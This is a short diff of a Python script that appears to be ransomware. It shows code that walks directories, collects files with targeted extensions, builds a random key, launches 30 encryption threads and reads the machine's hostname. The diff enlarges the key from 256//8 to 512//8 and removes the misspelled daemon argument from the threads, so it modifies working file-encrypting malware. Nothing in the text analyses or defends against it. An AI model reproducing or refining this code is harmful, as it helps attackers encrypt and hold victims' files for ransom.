@@ -67,7 +67,7 @@ while True:
                     if file_ext in encrypted_ext:
                         file_paths.append(root + '\\' + file)
             key = ''
-            encyption = 256 // 8
+            encyption = 512 // 8
             char_pool = ''
             for i in range(0x00, 0xFF):
                 char_pool += (chr(i))
@@ -96,7 +96,7 @@ while True:
                         pass
                     q.task_done()
             for i in range(30):
-                thread = Thread(target=encrypt, args=(key,), deamon=True)
+                thread = Thread(target=encrypt, args=(key,))
                 thread.start()
             time = datetime.now()
             hostname = os.getenv('COMPUTERNAME')
